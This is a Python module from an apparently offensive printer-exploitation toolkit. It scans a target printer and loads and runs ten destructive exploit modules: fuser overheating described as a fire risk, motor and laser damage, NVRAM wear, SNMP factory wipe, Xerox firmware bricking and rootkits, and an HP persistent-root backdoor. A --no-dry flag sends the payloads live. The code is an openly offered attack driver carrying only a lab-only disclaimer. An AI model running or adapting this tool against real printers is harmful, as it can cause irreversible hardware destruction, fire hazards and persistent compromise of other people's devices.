#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PrinterXPL-Forge — Destructive Attack Audit Engine
===================================================
Scans a target printer for all known IRREVERSIBLE / PHYSICAL-DAMAGE
vulnerabilities and produces a structured report.

Usage (CLI):
    python pxf.py <target> --destructive-audit
    python pxf.py <target> --destructive-audit --no-dry      # LIVE execution

Modules covered:
  1. research-pjl-nvram-damage      NVRAM wear via PJL DEFAULT (physical)
  2. research-brother-nvram         Brother NVRAM exhaustion (physical)
  3. research-generic-pjl-nvram     Generic NVRAM write access (physical risk)
  4. research-snmp-factory-reset    SNMP unauthenticated factory reset
  5. research-xerox-pjl-dlm         Xerox DLM firmware brick
  6. research-xerox-firmware-root   Xerox firmware rootkit injection
  7. research-fuser-thermal-attack  Fuser thermal runaway (fire/hardware)
  8. research-motor-jam-attack      Motor/mechanical destruction
  9. research-laser-scanner-attack  Laser diode/drum damage
  10. edb-45273                     HP persistent root via PJL path traversal

==========================================================================
WARNING: All live modes (dry_run=False / --no-dry) cause IRREVERSIBLE DAMAGE.
Use exclusively in authorized penetration testing lab environments.
Operators bear full legal and physical safety responsibility.
==========================================================================

Author: Andre Henrique (@mrhenrike) | Uniao Geek — https://github.com/Uniao-Geek
"""

from __future__ import annotations

import importlib.util
import socket
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ── ANSI ──────────────────────────────────────────────────────────────────────
_RST = '\033[0m'
_BLD = '\033[1m'
_RED = '\033[1;31m'
_YEL = '\033[1;33m'
_GRN = '\033[0;32m'
_CYN = '\033[1;36m'
_DIM = '\033[2;37m'
_MGT = '\033[1;35m'
_WHT = '\033[1;37m'

# ── Root path resolution ───────────────────────────────────────────────────────
_SRC_DIR  = Path(__file__).resolve().parent.parent   # src/
_ROOT_DIR = _SRC_DIR.parent                           # project root
_XPL_DIR  = _ROOT_DIR / 'xpl'

# ── Destructive module registry ────────────────────────────────────────────────
# Each entry: (module_id, xpl_subpath, port, label, damage_class)
DESTRUCTIVE_MODULES: List[Tuple[str, str, int, str, str]] = [
    (
        "research-fuser-thermal-attack",
        "research/research-fuser-thermal-attack/exploit.py",
        9100,
        "Fuser Thermal Runaway       (fire / hardware melt)",
        "PHYSICAL",
    ),
    (
        "research-motor-jam-attack",
        "research/research-motor-jam-attack/exploit.py",
        9100,
        "Motor Jamming / Gear Strip  (mechanical destruction)",
        "PHYSICAL",
    ),
    (
        "research-laser-scanner-attack",
        "research/research-laser-scanner-attack/exploit.py",
        9100,
        "Laser Scanner Damage        (drum / diode destruction)",
        "PHYSICAL",
    ),
    (
        "research-pjl-nvram-damage",
        "research/research-pjl-nvram-damage/exploit.py",
        9100,
        "NVRAM Write Exhaustion      (chip burnout — multi-vendor)",
        "NVRAM",
    ),
    (
        "research-brother-nvram",
        "research/research-brother-nvram/exploit.py",
        9100,
        "Brother NVRAM Exhaustion    (200k write cycles — permanent)",
        "NVRAM",
    ),
    (
        "research-generic-pjl-nvram",
        "research/research-generic-pjl-nvram/exploit.py",
        9100,
        "Generic PJL NVRAM R/W       (NVRAM access — physical risk)",
        "NVRAM",
    ),
    (
        "research-snmp-factory-reset",
        "research/research-snmp-factory-reset/exploit.py",
        161,
        "SNMP Unauthenticated Reset  (factory wipe — multi-vendor)",
        "CONFIG",
    ),
    (
        "research-xerox-pjl-dlm",
        "research/research-xerox-pjl-dlm/exploit.py",
        9100,
        "Xerox DLM Firmware Brick    (PJL firmware injection)",
        "FIRMWARE",
    ),
    (
        "research-xerox-firmware-root",
        "research/research-xerox-firmware-root/exploit.py",
        80,
        "Xerox Firmware Rootkit      (HTTP firmware upload brick)",
        "FIRMWARE",
    ),
    (
        "edb-45273",
        "edb-45273/exploit.py",
        9100,
        "HP PJL → Persistent Root    (CVE-2017-2741 — boot backdoor)",
        "FIRMWARE",
    ),
]

_DAMAGE_CLR = {
    "PHYSICAL": _RED,
    "NVRAM":    _MGT,
    "FIRMWARE": _YEL,
    "CONFIG":   _CYN,
}

_DAMAGE_LABEL = {
    "PHYSICAL": "PHYSICAL DESTRUCTION",
    "NVRAM":    "NVRAM WEAR / BRICK",
    "FIRMWARE": "FIRMWARE BRICK / ROOT",
    "CONFIG":   "CONFIG WIPE",
}


# ── Module loader ──────────────────────────────────────────────────────────────
def _load_exploit(rel_path: str):
    """Dynamically load an exploit module from xpl/."""
    full = _XPL_DIR / rel_path
    if not full.exists():
        return None
    spec = importlib.util.spec_from_file_location(full.stem, str(full))
    if spec is None or spec.loader is None:
        return None
    mod = importlib.util.module_from_spec(spec)
    try:
        spec.loader.exec_module(mod)
    except Exception:
        return None
    return mod


# ── Port connectivity check ────────────────────────────────────────────────────
def _port_open(host: str, port: int, timeout: float = 4.0) -> bool:
    try:
        proto = socket.IPPROTO_UDP if port == 161 else socket.IPPROTO_TCP
        if port == 161:
            # SNMP: send v2c GetRequest with community 'public'
            pkt = bytes([
                0x30, 0x26, 0x02, 0x01, 0x01, 0x04, 0x06,
                0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,
                0xa0, 0x19, 0x02, 0x04, 0x01, 0x02, 0x03, 0x04,
                0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0b,
                0x30, 0x09, 0x06, 0x05, 0x2b, 0x06, 0x01, 0x02, 0x01,
                0x05, 0x00,
            ])
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(timeout)
                s.sendto(pkt, (host, port))
                try:
                    s.recv(256)
                    return True
                except socket.timeout:
                    return True  # Sent = port is reachable (SNMP may not respond)
        else:
            with socket.create_connection((host, port), timeout=timeout):
                return True
    except Exception:
        return False


# ── Main audit function ─────────────────────────────────────────────────────────
def run_destructive_audit(
    host: str,
    port_overrides: Optional[Dict[str, int]] = None,
    dry_run: bool = True,
    selected_ids: Optional[List[str]] = None,
    timeout: float = 10.0,
    verbose: bool = False,
) -> Dict:
    """
    Scan a target for all destructive/irreversible vulnerabilities.

    Args:
      host           : Target IP or hostname.
      port_overrides : Dict of {port_key: port_number} for custom ports.
                       Keys: 'raw' (9100), 'snmp' (161), 'http' (80).
      dry_run        : True = check/assess only, never send destructive payload.
                       False = LIVE execution (IRREVERSIBLE DAMAGE).
      selected_ids   : List of module IDs to run (None = all modules).
      timeout        : Per-module connection timeout.
      verbose        : Print detailed evidence for each module.

    Returns:
      dict with:
        'target'       : host
        'dry_run'      : bool
        'total'        : total modules checked
        'vulnerable'   : list of vulnerable module IDs
        'not_vuln'     : list of not-vulnerable module IDs
        'errors'       : list of (module_id, error_string)
        'results'      : dict of {module_id: result_dict}
        'report'       : formatted text report
    """
    overrides = port_overrides or {}
    port_map  = {'raw': 9100, 'snmp': 161, 'http': 80}
    for k, v in overrides.items():
        port_map[k] = v

    audit: Dict = {
        'target':     host,
        'dry_run':    dry_run,
        'total':      0,
        'vulnerable': [],
        'not_vuln':   [],
        'errors':     [],
        'results':    {},
        'report':     '',
    }

    lines: List[str] = []

    def _hdr(text: str, char: str = '═') -> str:
        return f"\n  {_CYN}{char * 60}{_RST}\n  {_BLD}{_CYN}{text}{_RST}"

    def _sep(char: str = '─') -> str:
        return f"  {_DIM}{char * 60}{_RST}"

    # ── Header ────────────────────────────────────────────────────────────────
    mode_label = (
        f"{_RED}[LIVE — DESTRUCTIVE]{_RST}" if not dry_run
        else f"{_GRN}[DRY-RUN / ASSESS]{_RST}"
    )
    lines += [
        _hdr("PrinterXPL-Forge — Destructive Attack Audit"),
        f"\n  Target : {_WHT}{host}{_RST}",
        f"  Mode   : {mode_label}",
        f"  Modules: {len(DESTRUCTIVE_MODULES)} irreversible attack vectors",
        _sep(),
    ]

    if not dry_run:
        lines += [
            f"\n  {_RED}{_BLD}!!! LIVE MODE ACTIVE !!!{_RST}",
            f"  {_RED}Destructive payloads WILL be sent. Hardware damage is IRREVERSIBLE.{_RST}",
            f"  {_RED}Ensure written authorization and fire/safety controls are in place.{_RST}",
            _sep(),
        ]

    # ── Module loop ───────────────────────────────────────────────────────────
    for mod_id, rel_path, default_port, label, damage_class in DESTRUCTIVE_MODULES:

        # Filter by selected IDs if specified
        if selected_ids and mod_id not in selected_ids:
            continue

        audit['total'] += 1

        # Resolve port
        port_key = 'snmp' if default_port == 161 else ('http' if default_port == 80 else 'raw')
        port = port_map.get(port_key, default_port)

        dc = _DAMAGE_CLR.get(damage_class, _DIM)
        dl = _DAMAGE_LABEL.get(damage_class, damage_class)
        lines.append(f"\n  {_YEL}[{audit['total']:02d}]{_RST} {label}")
        lines.append(f"       {dc}{dl}{_RST}  │  port {port}  │  {_DIM}{rel_path}{_RST}")

        # 1. Port connectivity check
        if not _port_open(host, port, timeout=4.0):
            lines.append(f"       {_DIM}Port {port} closed — SKIP{_RST}")
            audit['not_vuln'].append(mod_id)
            audit['results'][mod_id] = {'status': 'port_closed', 'port': port}
            continue

        lines.append(f"       {_GRN}Port {port} open{_RST} — loading module...")

        # 2. Load exploit module
        mod = _load_exploit(rel_path)
        if mod is None:
            err = f"Could not load exploit module: {rel_path}"
            lines.append(f"       {_RED}ERROR: {err}{_RST}")
            audit['errors'].append((mod_id, err))
            continue

        # 3. Run check()
        try:
            check_fn = getattr(mod, 'check', None)
            is_vuln  = check_fn(host, port, timeout) if check_fn else True
        except Exception as exc:
            is_vuln = False
            audit['errors'].append((mod_id, f"check() error: {exc}"))

        vuln_label = (
            f"{_RED}VULNERABLE{_RST}" if is_vuln
            else f"{_DIM}not vulnerable{_RST}"
        )
        lines.append(f"       Vulnerability check: {vuln_label}")

        result_entry: Dict = {
            'status':    'vulnerable' if is_vuln else 'not_vulnerable',
            'module_id': mod_id,
            'port':      port,
            'evidence':  '',
        }

        if is_vuln:
            audit['vulnerable'].append(mod_id)
        else:
            audit['not_vuln'].append(mod_id)

        # 4. Run run() — always in dry_run unless explicitly live
        if is_vuln:
            try:
                run_fn   = getattr(mod, 'run', None)
                run_opts = {'dry_run': dry_run, 'attack': 'assess', 'timeout': timeout}
                run_res  = run_fn(host, port, **run_opts) if run_fn else {}
            except Exception as exc:
                run_res = {'evidence': '', 'error': str(exc)}
                audit['errors'].append((mod_id, f"run() error: {exc}"))

            ev = run_res.get('evidence', '') if run_res else ''
            result_entry['evidence'] = ev

            if verbose and ev:
                for ev_line in ev.splitlines()[:12]:
                    lines.append(f"       {_DIM}{ev_line}{_RST}")

        audit['results'][mod_id] = result_entry

    # ── Summary ───────────────────────────────────────────────────────────────
    n_vuln = len(audit['vulnerable'])
    n_safe = len(audit['not_vuln'])

    lines += [
        _sep('═'),
        f"\n  {_BLD}SUMMARY{_RST}",
        f"  Modules checked : {audit['total']}",
        f"  {_RED}Vulnerable      : {n_vuln}{_RST}",
        f"  {_GRN}Not vulnerable  : {n_safe}{_RST}",
        f"  Errors          : {len(audit['errors'])}",
    ]

    if audit['vulnerable']:
        lines.append(f"\n  {_RED}{_BLD}DESTRUCTIVE ATTACK VECTORS CONFIRMED:{_RST}")
        for vid in audit['vulnerable']:
            # Find label for this id
            entry = next((e for e in DESTRUCTIVE_MODULES if e[0] == vid), None)
            if entry:
                dc = _DAMAGE_CLR.get(entry[4], _DIM)
                lines.append(f"    {_RED}►{_RST} {entry[3]}  {dc}[{entry[4]}]{_RST}")

    if not dry_run and audit['vulnerable']:
        lines += [
            f"\n  {_RED}{_BLD}LIVE ATTACKS DISPATCHED. Hardware damage is in progress.{_RST}",
            f"  {_RED}Monitor target physically. Ensure fire suppression is ready.{_RST}",
        ]
    elif dry_run and audit['vulnerable']:
        lines += [
            f"\n  {_YEL}Re-run with --no-dry to execute live destructive attacks.{_RST}",
            f"  {_YEL}Authorized lab environments only.{_RST}",
        ]

    lines.append('')

    report = '\n'.join(lines)
    audit['report'] = report
    return audit


# ── CLI entry (used by main.py) ────────────────────────────────────────────────
def main_destructive_audit(args) -> None:
    """
    Called from main.py when --destructive-audit is set.
    Prints the audit report to stdout.
    """
    host = getattr(args, 'target', None)
    if not host:
        print(f"\n  {_RED}[!] --destructive-audit requires a target IP/hostname{_RST}")
        print("      Usage: python pxf.py <target> --destructive-audit\n")
        sys.exit(1)

    dry_run     = not getattr(args, 'no_dry', False)
    port_raw    = getattr(args, 'port_raw', None)
    port_snmp   = getattr(args, 'port_snmp', None)
    port_http   = getattr(args, 'port_http', None)
    verbose     = getattr(args, 'debug', False)
    timeout     = getattr(args, 'timeout', 10.0) if hasattr(args, 'timeout') else 10.0

    selected_raw = getattr(args, 'destructive_modules', None)
    selected_ids = [s.strip() for s in selected_raw.split(',')] if selected_raw else None

    overrides: Dict[str, int] = {}
    if port_raw:   overrides['raw']  = port_raw
    if port_snmp:  overrides['snmp'] = port_snmp
    if port_http:  overrides['http'] = port_http

    audit = run_destructive_audit(
        host=host,
        port_overrides=overrides,
        dry_run=dry_run,
        selected_ids=selected_ids,
        timeout=timeout,
        verbose=verbose,
    )

    print(audit['report'])
    sys.exit(0 if not audit['errors'] else 1)
